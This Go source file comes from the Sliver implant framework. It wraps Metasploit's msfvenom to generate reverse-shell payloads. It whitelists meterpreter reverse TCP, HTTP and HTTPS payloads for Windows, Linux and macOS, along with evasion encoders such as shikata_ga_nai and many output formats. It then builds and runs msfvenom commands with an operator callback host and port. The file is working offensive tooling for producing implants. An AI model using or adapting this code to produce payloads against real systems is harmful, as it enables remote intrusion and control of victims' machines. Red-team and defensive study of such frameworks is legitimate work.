package msf

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bytes"
	"fmt"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"sync"

	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/server/assets"
	"github.com/bishopfox/sliver/server/log"
)

const (
	consoleBin = "msfconsole"
	venomBin   = "msfvenom"
	sep        = "/"
	msfDir     = "msf"
)

var (
	msfLog = log.NamedLogger("msf", "venom")

	// ValidArches - Support CPU architectures
	ValidArches = map[string]bool{
		"x86": true,
		"x64": true,
	}

	// ValidEncoders - Valid MSF encoders
	ValidEncoders = map[string]bool{
		"":                   true,
		"x86/shikata_ga_nai": true,
		"x64/xor_dynamic":    true,
	}

	// ValidPayloads - Valid payloads and OS combos
	validPayloads = map[string]map[string]bool{
		"windows": {
			"meterpreter_reverse_http":  true,
			"meterpreter_reverse_https": true,
			"meterpreter_reverse_tcp":   true,
			"meterpreter/reverse_tcp":   true,
			"meterpreter/reverse_http":  true,
			"meterpreter/reverse_https": true,
			"custom/reverse_winhttp":    true,
			"custom/reverse_winhttps":   true,
			"custom/reverse_tcp":        true,
		},
		"linux": {
			"meterpreter_reverse_http":  true,
			"meterpreter_reverse_https": true,
			"meterpreter_reverse_tcp":   true,
		},
		"osx": {
			"meterpreter_reverse_http":  true,
			"meterpreter_reverse_https": true,
			"meterpreter_reverse_tcp":   true,
		},
	}

	validFormats = map[string]bool{
		"bash":          true,
		"c":             true,
		"csharp":        true,
		"dw":            true,
		"dword":         true,
		"hex":           true,
		"java":          true,
		"js_be":         true,
		"js_le":         true,
		"num":           true,
		"perl":          true,
		"pl":            true,
		"powershell":    true,
		"ps1":           true,
		"py":            true,
		"python":        true,
		"raw":           true,
		"rb":            true,
		"ruby":          true,
		"sh":            true,
		"vbapplication": true,
		"vbscript":      true,
	}

	msfModuleTypes = []string{
		"encoders",
		"payloads",
		"formats",
		"archs",
	}
)

var msfCache = sync.Map{}

// VenomConfig -
type VenomConfig struct {
	Os         string
	Arch       string
	Payload    string
	Encoder    string
	Iterations int
	LHost      string
	LPort      uint16
	BadChars   []string
	Format     string
	Luri       string
	AdvOptions string
}

// CacheModules parses the text output of some our relevant
// Metasploit generation helpers, to be used for completions.
func CacheModules() {
	if _, err := exec.LookPath(venomBin); err != nil {
		return
	}

	msfLog.Infof("Caching msfvenom data (this may take a few seconds)")

	all := sync.WaitGroup{}

	for i := range msfModuleTypes {
		all.Add(1)
		target := msfModuleTypes[i]

		go func() {
			defer all.Done()

			result, err := venomCmd([]string{"--list", target})
			if err != nil {
				msfLog.Error(err)
				return
			}

			fileName := filepath.Join(MsfDir(), "msf-"+target+".cache")
			if err := os.WriteFile(fileName, result, 0o600); err != nil {
				msfLog.Error(err)
			}
		}()
	}

	all.Wait()
	msfLog.Infof("Done caching msfvenom data")
}

// GetRootAppDir - Get the Sliver app dir, default is: ~/.sliver/
func MsfDir() string {
	msfDir := filepath.Join(assets.GetRootAppDir(), msfDir)

	if _, err := os.Stat(msfDir); os.IsNotExist(err) {
		err = os.MkdirAll(msfDir, 0o700)
		if err != nil {
			msfLog.Fatalf("Cannot write to sliver root dir %s", err)
		}
	}
	return msfDir
}

// GetMsfCache returns the cache of Metasploit modules and other info.
func GetMsfCache() *clientpb.MetasploitCompiler {
	formats, ok := msfCache.Load("formats")
	if !ok {
		loadCache()
	}

	formats, ok = msfCache.Load("formats")
	archs, _ := msfCache.Load("archs")
	payloads, _ := msfCache.Load("payloads")
	encoders, _ := msfCache.Load("encoders")

	msf := &clientpb.MetasploitCompiler{
		Formats:  formats.([]string),
		Archs:    archs.([]string),
		Payloads: payloads.([]*clientpb.MetasploitModule),
		Encoders: encoders.([]*clientpb.MetasploitModule),
	}

	return msf
}

// Version - Return the version of MSFVenom
func Version() (string, error) {
	stdout, err := consoleCmd([]string{"--version"})
	return string(stdout), err
}

// VenomPayload - Generates an MSFVenom payload
func VenomPayload(config VenomConfig) ([]byte, error) {
	// Check if msfvenom is in the path
	if _, err := exec.LookPath(venomBin); err != nil {
		return nil, fmt.Errorf("msfvenom not found in PATH")
	}
	// OS
	if _, ok := validPayloads[config.Os]; !ok {
		return nil, fmt.Errorf(fmt.Sprintf("Invalid operating system: %s", config.Os))
	}
	// Arch
	if _, ok := ValidArches[config.Arch]; !ok {
		return nil, fmt.Errorf(fmt.Sprintf("Invalid arch: %s", config.Arch))
	}
	// Payload
	if _, ok := validPayloads[config.Os][config.Payload]; !ok {
		return nil, fmt.Errorf(fmt.Sprintf("Invalid payload: %s", config.Payload))
	}
	// Encoder
	if _, ok := ValidEncoders[config.Encoder]; !ok {
		return nil, fmt.Errorf(fmt.Sprintf("Invalid encoder: %s", config.Encoder))
	}
	// Check format
	if _, ok := validFormats[config.Format]; !ok {
		return nil, fmt.Errorf(fmt.Sprintf("Invalid format: %s", config.Format))
	}

	target := config.Os
	if config.Arch == "x64" {
		target = strings.Join([]string{config.Os, config.Arch}, sep)
	}
	payload := strings.Join([]string{target, config.Payload}, sep)

	// LURI handling for HTTP stager
	luri := config.Luri
	if luri != "" {
		luri = fmt.Sprintf("LURI=%s", luri)
	}

	// Parse advanced options
	advancedOptions := make(map[string]string)
	if config.AdvOptions != "" {
		options, err := url.ParseQuery(config.AdvOptions)
		if err != nil {
			return nil, fmt.Errorf("could not parse provided advanced options: %s", err.Error())
		}
		for option, value := range options {
			// Options should only be specified once,
			// so if a given option is specified more than once, use the last value
			advancedOptions[option] = value[len(value)-1]
		}
	}

	args := []string{
		"--platform", config.Os,
		"--arch", config.Arch,
		"--format", config.Format,
		"--payload", payload,
		fmt.Sprintf("LHOST=%s", config.LHost),
		fmt.Sprintf("LPORT=%d", config.LPort),
		"EXITFUNC=thread",
	}

	for optionName, optionValue := range advancedOptions {
		args = append(args, fmt.Sprintf("%s=%s", optionName, optionValue))
	}

	if luri != "" {
		args = append(args, luri)
	}
	// Check badchars for stager
	if len(config.BadChars) > 0 {
		for _, b := range config.BadChars {
			// using -b instead of --bad-chars
			// as it made msfvenom crash on my machine
			badChars := fmt.Sprintf("-b %s", b)
			args = append(args, badChars)
		}
	}

	if config.Encoder != "" && config.Encoder != "none" {
		iterations := config.Iterations
		if iterations <= 0 || 50 <= iterations {
			iterations = 1
		}
		args = append(args,
			"--encoder", config.Encoder,
			"--iterations", strconv.Itoa(iterations))
	}

	return venomCmd(args)
}

// venomCmd - Execute a msfvenom command
func venomCmd(args []string) ([]byte, error) {
	msfLog.Printf("%s %v", venomBin, args)
	cmd := exec.Command(venomBin, args...)
	var stdout bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	err := cmd.Run()
	msfLog.Println(cmd.String())
	if err != nil {
		msfLog.Printf("--- stdout ---\n%s\n", stdout.String())
		msfLog.Printf("--- stderr ---\n%s\n", stderr.String())
		msfLog.Print(err)
	}

	return stdout.Bytes(), err
}

// consoleCmd - Execute a msfvenom command
func consoleCmd(args []string) ([]byte, error) {
	cmd := exec.Command(consoleBin, args...)
	var stdout bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	err := cmd.Run()
	if err != nil {
		msfLog.Printf("--- stdout ---\n%s\n", stdout.String())
		msfLog.Printf("--- stderr ---\n%s\n", stderr.String())
		msfLog.Print(err)
	}

	return stdout.Bytes(), err
}

// Arch - Convert golang arch to msf arch
func Arch(arch string) string {
	if arch == "amd64" {
		return "x64"
	}
	return "x86"
}

func loadCache() {
	msf := parseCache()

	if len(msf.Formats) == 0 {
		return
	}

	msfCache.Store("formats", msf.Formats)
	msfCache.Store("archs", msf.Archs)
	msfCache.Store("payloads", msf.Payloads)
	msfCache.Store("encoders", msf.Encoders)
}

// parseCache returns the MSFvenom information useful to Sliver.
func parseCache() *clientpb.MetasploitCompiler {
	msf := &clientpb.MetasploitCompiler{}

	if _, err := exec.LookPath(venomBin); err != nil {
		return msf
	}

	ver, err := Version()
	if err != nil {
		return msf
	}

	msf.Version = ver

	for _, file := range msfModuleTypes {
		fileName := filepath.Join(MsfDir(), fmt.Sprintf("msf-%s.cache", file))

		switch file {
		case "formats":
			if formats, err := os.ReadFile(fileName); err == nil {
				raw := strings.Split(string(formats), "----")
				all := strings.Split(raw[len(raw)-1], "\n")

				for _, fmt := range all {
					msf.Formats = append(msf.Formats, strings.TrimSpace(fmt))
				}
			}

		case "archs":
			if archs, err := os.ReadFile(fileName); err == nil {
				raw := strings.Split(string(archs), "----")
				all := strings.Split(raw[len(raw)-1], "\n")

				for _, arch := range all {
					msf.Archs = append(msf.Archs, strings.TrimSpace(arch))
				}
			}

		case "payloads":
			if payloads, err := os.ReadFile(fileName); err == nil {
				raw := strings.Split(string(payloads), "-----------")
				all := strings.Split(raw[len(raw)-1], "\n")

				for _, info := range all {
					payload := &clientpb.MetasploitModule{}

					items := filterEmpty(strings.Split(strings.TrimSpace(info), " "))

					if len(items) > 0 {
						fullname := strings.TrimSpace(items[0])
						payload.FullName = fullname
						payload.Name = filepath.Base(fullname)
					}
					if len(items) > 1 {
						payload.Description = strings.Join(items[1:], " ")
					}

					msf.Payloads = append(msf.Payloads, payload)
				}
			}

		case "encoders":
			if encoders, err := os.ReadFile(fileName); err == nil {
				raw := strings.Split(string(encoders), "-----------")
				all := strings.Split(raw[len(raw)-1], "\n")

				for _, info := range all {
					encoder := &clientpb.MetasploitModule{}

					// First split the name from everything else following.
					items := filterEmpty(strings.Split(strings.TrimSpace(info), " "))
					if len(items) == 0 {
						continue
					}

					if len(items) > 0 {
						fullname := strings.TrimSpace(items[0])
						encoder.FullName = fullname
						encoder.Name = filepath.Base(fullname)
					}

					// Then try to find a level, and a description.
					if len(items) > 1 {
						encoder.Quality = strings.TrimSpace(items[1])
						encoder.Description = strings.Join(items[2:], " ")
					}

					msf.Encoders = append(msf.Encoders, encoder)
				}
			}
		}
	}

	return msf
}

func filterEmpty(list []string) []string {
	var full []string
	for _, item := range list {
		trim := strings.TrimSpace(item)
		if trim != "" {
			full = append(full, trim)
		}
	}

	return full
}
